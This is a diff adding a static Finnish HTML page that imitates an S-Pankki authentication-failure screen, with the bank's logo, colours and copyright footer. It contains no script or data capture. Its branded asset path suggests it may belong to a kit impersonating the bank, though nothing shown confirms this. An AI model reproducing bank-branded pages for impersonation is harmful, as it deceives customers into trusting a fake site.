@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="fi">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="google" content="notranslate">
+    <title>Tunnistautuminen</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+        .container-wrapper {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        header {
+            background: #00a651;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            height: auto;
+            margin: 0 auto 10px;
+            display: block;
+        }
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        .content {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            text-align: center;
+        }
+        .page-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: #333;
+        }
+        .icon-wrapper {
+            margin: 0 auto 30px;
+            width: 120px;
+            height: 120px;
+            background: #ffe5e5;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .icon-wrapper svg {
+            width: 64px;
+            height: 64px;
+            fill: #ff0000;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            background: #00a651;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .button:hover {
+            background: #008a42;
+        }
+        p {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #ff0000;
+        }
+        .sub-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+        }
+        footer {
+            background: #f5f5f5;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-wrapper">
+        <header>
+            <img class="logo" src="/spankki-files/s-bank-fi.svg" alt="S-Pankki">
+        </header>
+
+        <main role="main">
+            <div class="content">
+                <h1 class="page-title">Jotain meni pieleen</h1>
+                <div class="icon-wrapper">
+                    <svg viewBox="0 0 64 64">
+                        <path d="M32,4C16.536,4,4,16.536,4,32s12.536,28,28,28s28-12.536,28-28S47.464,4,32,4z M32,56 C18.641,56,8,45.359,8,32S18.641,8,32,8s24,10.641,24,24S45.359,56,32,56z"></path>
+                        <path d="M28,28l8,8l8-8M28,36l8-8l8,8"></path>
+                    </svg>
+                </div>
+                <p>Tunnistautuminen epäonnistui</p>
+                <p class="sub-text">Jotain meni pieleen. Yritä myöhemmin uudelleen.</p>
+                <button class="button" type="button" id="error-close">Aloita alusta</button>
+            </div>
+        </main>
+
+        <footer>
+            <div>© S-Pankki 2026</div>
+        </footer>
+    </div>
+</body>
+</html>
+
